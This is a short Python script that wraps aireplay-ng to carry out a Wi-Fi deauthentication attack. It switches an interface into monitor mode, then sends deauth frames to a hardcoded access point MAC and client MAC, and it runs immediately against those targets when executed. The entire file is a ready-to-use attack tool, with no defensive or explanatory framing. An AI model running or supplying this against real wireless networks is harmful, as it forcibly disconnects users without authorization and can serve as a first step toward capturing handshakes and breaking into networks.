import subprocess
from interface_manager import get_mode
from monitor_mode import enable_monitor_mode, disable_monitor_mode

def deauth(station_mac, client_mac, interface):
    initial_mode = get_mode(interface)
    print(f"Initial mode is: {initial_mode}")

    if initial_mode != "monitor":
        monitor_interface = enable_monitor_mode(interface)
        if monitor_interface is None:
            print("Failed to enable monitor mode. Aborting deauth attack.")
            return
    else:
        monitor_interface = interface

    # Perform the deauth attack
    print(f"Performing deauth attack on AP: {station_mac} and Client: {client_mac} using interface: {monitor_interface}")
    print(f"Running command: sudo aireplay-ng --deauth 5 -a {station_mac} -c {client_mac} {monitor_interface}")
    subprocess.run(["sudo", "aireplay-ng", "--deauth", "5", "-a", station_mac, "-c", client_mac, monitor_interface])


    if initial_mode != "monitor":
        disable_monitor_mode(monitor_interface)


station_mac = "98:48:27:4B:4B:4E"
client_mac = "28:6C:07:AB:8C:53"
interface = "wlp0s20f0u4"

deauth(station_mac, client_mac, interface)
